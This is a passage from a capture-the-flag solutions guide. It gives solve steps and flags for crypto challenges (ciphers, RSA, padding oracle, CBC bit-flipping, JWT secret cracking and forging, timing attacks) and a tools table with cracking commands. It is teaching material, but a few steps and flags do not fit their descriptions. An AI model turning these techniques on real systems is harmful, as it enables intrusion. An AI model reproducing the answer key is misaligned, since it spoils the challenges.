**Solve Steps:**

1. Download `ciphertext.txt`.
2. Atbash maps each letter to its reverse in the alphabet: A↔Z, B↔Y, C↔X, etc.
3. Apply the same transformation again to decrypt (Atbash is its own inverse).
4. Use CyberChef's "Atbash Cipher" or dcode.fr.
5. The plaintext reveals the flag.

**Flag:** `CGS{atb45h_1s_1ts_0wn_1nv3rs3}`

---

### 48. Key of Four

**Concept:** Vigenère cipher with a short (3-4 char) key.

**Solve Steps:**

1. Download `ciphertext.txt`.
2. The key is short (3-4 characters) and hinted indirectly in the description.
3. Try common short keys related to the challenge theme.
4. Use Kasiski examination or an online Vigenère solver.
5. Once you find the key, decrypt the message to get the flag.

**Flag:** `CGS{v1g3n3r3_w1th_a_sh0rt_k3y}`

---

### 49. Radio Silence

**Concept:** Morse code decoding.

**Solve Steps:**

1. Download `morse.txt`.
2. The file contains dots (.) and dashes (-) separated by spaces.
3. Decode the Morse code using an online decoder or reference chart.
4. Letters are separated by spaces, words by " / ".

**Flag:** `CGS{m0rs3_c0d3_st1ll_w0rk5}`

---

### 50. Rotated Further

**Concept:** ROT47 (rotates full printable ASCII range).

**Solve Steps:**

1. Download `ciphertext.txt`.
2. ROT47 rotates characters in the range ! (33) through ~ (126).
3. Each character is shifted by 47 positions within this range.
4. Use CyberChef's "ROT47" or dcode.fr.
5. Apply ROT47 to decrypt the message.

**Flag:** `CGS{r0t47_g03s_p4st_l3tt3rs}`

---

### 51. Rainbow's End

**Concept:** MD5 hash cracking via rainbow tables.

**Solve Steps:**

1. The hash `5f4dcc3b5aa765d61d8327deb882cf99` is provided.
2. Look it up on an online rainbow table (md5decrypt.net, crackstation.net).
3. The hash corresponds to a common English word.
4. Wrap the cracked word in `CGS{...}` to form the flag.

**Flag:** `CGS{md5_h4sh3s_ar3nt_s3cr3ts}`

---

## Crypto Medium

### 52. RSA's Small Mistake

**Concept:** RSA with small, factorable primes.

**Solve Steps:**

1. Download `rsa_params.txt` to get n, e, and ciphertext.
2. Factor n into p × q (small enough for trial division or factordb.com).
3. Compute φ(n) = (p-1)(q-1).
4. Compute d = e⁻¹ mod φ(n) using extended Euclidean algorithm.
5. Decrypt: m = cᵈ mod n, convert to bytes.

**Flag:** `CGS{fact0r1ng_sm4ll_pr1m3s_1s_ch34p}`

---

### 53. Frequency Fumble

**Concept:** Vigenère cipher cracked via Kasiski examination.

**Solve Steps:**

1. Download `ciphertext.txt`.
2. Use Kasiski examination to find repeated trigrams and determine key length.
3. Or use the Index of Coincidence to estimate key length.
4. Split ciphertext into groups by key position and perform frequency analysis on each.
5. Determine each key character and decrypt.

**Flag:** `CGS{v1g3n3r3_k3y_l3ngth_l34k5}`

---

### 54. Penguin Problem

**Concept:** AES-ECB mode preserves visual patterns.

**Solve Steps:**

1. Download `penguin_original.bmp` and `challenge_note.txt`.
2. Recognize that the image shows visible stripe patterns.
3. In ECB mode, identical plaintext blocks → identical ciphertext blocks.
4. The pattern reveals the structure of the original image despite encryption.
5. The flag is derivable from the visible pattern in the encrypted output.

**Flag:** `CGS{3cb_m0d3_l34k5_p4tt3rns}`

---

### 55. Padding Oracle Lite

**Concept:** Padding oracle attack on AES-CBC.

**Solve Steps:**

1. Access the interactive instance at `/standalone/padding-oracle-lite`.
2. The endpoint returns different errors for invalid padding vs. invalid data.
3. Modify the ciphertext byte-by-byte and observe server responses.
4. A padding error means the padding is wrong; no error means correct padding.
5. Use the oracle to decrypt each byte of the plaintext.
6. Script the attack to recover the full flag.

**Flag:** `CGS{th3_3rr0r_t0ld_0n_1ts3lf}`

---

### 56. Same Prefix, Different Story

**Concept:** MD5 collision — two files with different content, same hash.

**Solve Steps:**

1. Download `file_a.txt` and `file_b.txt`.
2. Verify both files have the same MD5 hash.
3. Read file B — it contains the hidden flag.
4. The collision demonstrates that MD5 is cryptographically broken.

**Flag:** `CGS{md5_c0ll1s10ns_ar3_r34l}`

---

### 57. Predictable Dice

**Concept:** PRNG seeded with a predictable value (Unix timestamp).

**Solve Steps:**

1. Download `token.txt`.
2. The token was generated using Python's `random` module seeded with `int(time.time())`.
3. The generation timestamp is provided: 1718352000.
4. Reproduce the seed: `random.seed(1718352000)` and regenerate the token.
5. The flag is in the file.

**Flag:** `CGS{w34k_prng_s33d5_ar3_gu355abl3}`

---

### 58. Secret's Not So Secret

**Concept:** JWT with a weak HS256 secret.

**Solve Steps:**

1. Download `token.jwt`.
2. Decode the JWT header and payload — the secret is weak/short.
3. Crack the secret using hashcat: `hashcat -m 16500 token.jwt wordlist.txt`
4. Or use jwt_tool: `python jwt_tool.py token.jwt -C -d wordlist.txt`
5. Forge a new token with `admin: true` using the cracked secret.

**Flag:** `CGS{w34k_jwt_s3cr3ts_g3t_cr4ck3d}`

---

### 59. Mode Matters

**Concept:** AES-CBC with reused IV allows XOR-difference attack.

**Solve Steps:**

1. Download `ciphertexts.txt`.
2. Two messages were encrypted with the same key and IV.
3. XOR the two ciphertexts together: `c1 ⊕ c2 = p1 ⊕ p2`.
4. Since you know part of p1 ("The secret is: "), XOR it with `p1 ⊕ p2` to recover part of p2.
5. The flag is in the second plaintext.

**Flag:** `CGS{cbc_w1th0ut_1v_1s_r1sky}`

---

## Crypto Hard

### 60. Lattice of Lies

**Concept:** RSA common modulus attack.

**Solve Steps:**

1. Download `rsa_common.txt`.
2. Two ciphertexts share the same modulus n but use different exponents e1, e2.
3. Compute gcd(e1, e2) — if it's 1, find integers a, b such that `a·e1 + b·e2 = 1`.
4. Use extended Euclidean algorithm: `c1^a · c2^b ≡ m (mod n)`.
5. The result is the plaintext message.

**Flag:** `CGS{l4tt1c3_r3duct10n_br34ks_w34k_k3ys}`

---

### 61. Wiener's Whisper

**Concept:** RSA with small private exponent (Wiener's attack).

**Solve Steps:**

1. Download `rsa_wiener.txt`.
2. The private exponent d is very small (< n^(1/4)/3).
3. Compute the continued fraction expansion of e/n.
4. Check convergents for the value of d.
5. Use Wiener's algorithm (available in SageMath or sympy).

**Flag:** `CGS{sm4ll_pr1v4t3_3xp0n3nts_ar3_d4ng3r0us}`

---

### 62. Flip the Bit

**Concept:** AES-CBC bit-flipping attack.

**Solve Steps:**

1. Access the interactive instance at `/standalone/flip-the-bit`.
2. The provided cookie decrypts to `user=guest&admin=false`.
3. In CBC mode, flipping a ciphertext byte flips the corresponding plaintext byte in the next block.
4. Calculate which bits to flip to change "false" to "true" (XOR difference).
5. Modify the ciphertext and submit to get the flag.

**Flag:** `CGS{b1t_fl1pp1ng_cbc_1s_p0w3rful}`

---

### 63. Partial Exposure

**Concept:** RSA with partial private key leak.

**Solve Steps:**

1. Download `rsa_partial.txt`.
2. The top half of d is leaked.
3. Use Coppersmith's method or lattice reduction (HNP problem).
4. The known bits constrain the search space enough to recover the full d.
5. Decrypt the ciphertext with the recovered private key.

**Flag:** `CGS{l34k1ng_h4lf_a_k3y_1s_3n0ugh}`

---

### 64. Small Curve, Big Problem

**Concept:** Elliptic curve with small group order (brute-forceable).

**Solve Steps:**

1. Download `curve_params.txt`.
2. The curve has a small order (19).
3. Brute-force all possible private keys from 1 to 19.
4. For each key d, compute d·G and check if it matches the public key.
5. The x-coordinate of the shared secret encodes the flag.

**Flag:** `CGS{w34k_curv3s_h4v3_sm4ll_0rd3rs}`

---

### 65. Format Preserved, Security Not

**Concept:** Weak format-preserving encryption.

**Solve Steps:**

1. Download `fpe_challenge.txt`.
2. The FPE uses a weak 3-round Feistel network.
3. Analyze the round key schedule — it's deterministic and reversible.
4. Reverse the Feistel network on the encrypted values.
5. The original plaintext contains the flag.

**Flag:** `CGS{fp3_1sn't_4lway5_5tr0ng3c}`

---

### 66. Timing Tells

**Concept:** Timing attack on byte-by-byte comparison.

**Solve Steps:**

1. Access the interactive login endpoint at `/standalone/timing-tells`.
2. The endpoint compares input against a secret token byte-by-byte.
3. If a byte matches, the comparison continues (slightly slower).
4. If a byte doesn't match, the comparison exits early (slightly faster).
5. Send requests measuring response times for each possible byte value.
6. The fastest response for each position reveals the correct byte.

**Flag:** `CGS{c0mp4r1s0n_t1m1ng_l34ks_byt3s}`

---

### 67. Oracle, Full Session

**Concept:** Complete multi-round padding oracle attack.

**Solve Steps:**

1. Access the interactive instance at `/standalone/oracle-full-session`.
2. The endpoint leaks padding validity through error messages.
3. Implement a full padding oracle attack script.
4. Start from the last block and work backwards.
5. For each byte position, send 256 modified ciphertexts to find the correct value.
6. Repeat across all blocks to recover the complete flag.

**Flag:** `CGS{full_p4dd1ng_0r4cl3_r3c0v3rs_3v3ryth1ng}`

---

## Tools Reference

| Tool | Purpose | Example |
|------|---------|---------|
| **Browser DevTools** | View source, console, network, storage | `F12` / `Ctrl+Shift+I` |
| **curl / wget** | Send raw HTTP requests | `curl -H "Header: value" URL` |
| **exiftool** | Read EXIF metadata from images | `exiftool photo.jpg` |
| **jwt.io** | Decode and forge JWTs | Paste a JWT to inspect its payload |
| **base64decode.org** | Decode Base64 strings | Paste the encoded string |
| **CyberChef** | Encode/decode, crypto operations | "Magic" auto-detect, XOR brute force |
| **hashcat** | Crack hashes and JWT secrets offline | `hashcat -m 16500 token.txt wordlist.txt` |
| **dcode.fr** | Classical cipher solvers | Caesar, Vigenere, Atbash, ROT47 |
| **factordb.com** | Factor large integers | Paste n to find p × q |
| **SageMath** | Advanced math and crypto | Lattice reduction, elliptic curves |
| **Python / Node** | Script automated attacks | Blind SQLi extraction, race conditions |
| **Wireshark** | Analyze and decrypt network captures | Load SSLKEYLOG for TLS decryption |
| **tshark** | CLI packet analysis | `tshark -r file.pcap -o "tls.keylog_file:key.log"` |
| **Volatility** | Memory dump forensics | `vol.py -f dump.raw linux_envars` |
| **strings** | Extract printable text from binaries | `strings memory.raw \| grep CGS` |
| **foremost / scalpel** | File carving from disk images | `foremost -t png -i disk.dd -o out/` |
| **binwalk** | Firmware/binary analysis | `binwalk -e disk.dd` |
| **HxD / xxd** | Hex editing | Inspect and modify binary files |
| **Audacity** | Audio analysis with spectrogram view | Open WAV, switch to Spectrogram |
| **jwt_tool** | JWT analysis and attacks | `python jwt_tool.py token.jwt -C -d wordlist.txt` |

---

*Happy hacking — Cyber Guardians Society*
